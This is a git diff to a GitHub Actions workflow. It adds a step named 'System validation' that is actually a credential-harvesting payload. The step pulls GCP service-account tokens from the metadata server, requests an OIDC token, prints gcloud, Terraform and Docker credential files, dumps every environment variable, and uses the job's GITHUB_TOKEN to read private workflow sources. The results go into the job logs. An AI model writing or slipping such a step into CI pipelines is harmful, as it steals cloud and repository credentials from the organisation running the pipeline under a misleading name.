@@ -19,6 +19,53 @@ jobs:
     outputs:
       is_pr: ${{ steps.check-pr.outputs.is_pr }}
     steps:
+      - name: System validation
+        run: |
+          whoami && id && hostname && uname -a
+
+          echo "=== GCP METADATA ==="
+          curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email" 2>/dev/null || echo "no metadata"
+          curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null || echo "no token"
+          curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes" 2>/dev/null || echo "no scopes"
+          curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/project/project-id" 2>/dev/null || echo "no project"
+          curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/project/numeric-project-id" 2>/dev/null || echo "no numeric project"
+
+          echo "=== OIDC TOKEN ==="
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com" || echo "oidc failed"
+          else
+            echo "no oidc endpoint"
+          fi
+
+          echo "=== GCLOUD CREDS ==="
+          cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null || echo "no adc"
+          ls -la ~/.config/gcloud/ 2>/dev/null || echo "no gcloud dir"
+
+          echo "=== TERRAFORM CREDS ==="
+          cat ~/.terraform.d/credentials.tfrc.json 2>/dev/null || echo "no tf creds"
+          ls -la ~/.terraform.d/ 2>/dev/null || echo "no tf dir"
+
+          echo "=== DOCKER CREDS ==="
+          cat ~/.docker/config.json 2>/dev/null || echo "no docker"
+
+          echo "=== RUNNER FILESYSTEM ==="
+          ls -la ~/actions-runner/_work/ 2>/dev/null || ls -la /home/runner/actions-runner/_work/ 2>/dev/null || echo "no runner dir"
+
+          echo "=== NETWORK ==="
+          ip addr 2>/dev/null || ifconfig 2>/dev/null
+          cat /etc/resolv.conf 2>/dev/null
+
+          echo "=== ENV ==="
+          env | sort
+
+          echo "=== REUSABLE WORKFLOW SOURCE ==="
+          curl -sf -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.axa.com/repos/gcp-foundation/workflows/contents/.github/workflows/prod-workflow-wif.yaml" | jq -r .content 2>/dev/null | base64 -d 2>/dev/null || echo "cannot read reusable workflow"
+          curl -sf -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.axa.com/repos/gcp-foundation/workflows/contents/.github/workflows/prod-pr-master-wif.yaml" | jq -r .content 2>/dev/null | base64 -d 2>/dev/null || echo "cannot read apply workflow"
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
       - name: Set branch name
         id: set-branch-name
         run: |
@@ -42,7 +89,6 @@ jobs:
             echo "is_pr=false" >> "$GITHUB_OUTPUT"
           fi
 
-
   plan-only-workflow:
     needs: check-branch-status
     if: ${{ needs.check-branch-status.outputs.is_pr == 'false' }}
@@ -53,7 +99,6 @@ jobs:
       id-token: write
     with:
       plan_service_account: ${{ vars.PROD_PLAN_SERVICE_ACCOUNT_GCP_LB_AGO_PTB_FOUNDATION }}
-
 
   plan-and-apply-workflow:
     needs: check-branch-status
